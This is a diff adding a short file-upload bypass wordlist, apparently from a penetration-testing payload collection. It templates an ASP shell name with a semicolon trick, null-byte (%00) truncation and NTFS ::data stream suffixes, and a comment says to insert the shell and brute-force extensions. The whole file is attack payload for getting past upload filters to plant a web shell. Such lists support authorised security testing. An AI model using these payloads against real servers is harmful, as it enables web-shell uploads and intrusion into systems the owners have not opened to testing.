@@ -1,0 +1,9 @@
+# {ASPSCRIPT}gets regex replaced with the shell or other file you are trying to upload, {EXT} should be brute-forced with payloads from discovery/filename-bruteforce/file-extensions/, since some file upload types may be allowed that are not listed.
+{ASPSCRIPT}
+{ASPSCRIPT}.{EXT}
+{ASPSCRIPT};
+{ASPSCRIPT};.{EXT}
+{ASPSCRIPT}%00
+{ASPSCRIPT}%00.{EXT}
+{ASPSCRIPT}::data%00.
+{ASPSCRIPT}::data%00.{EXT}
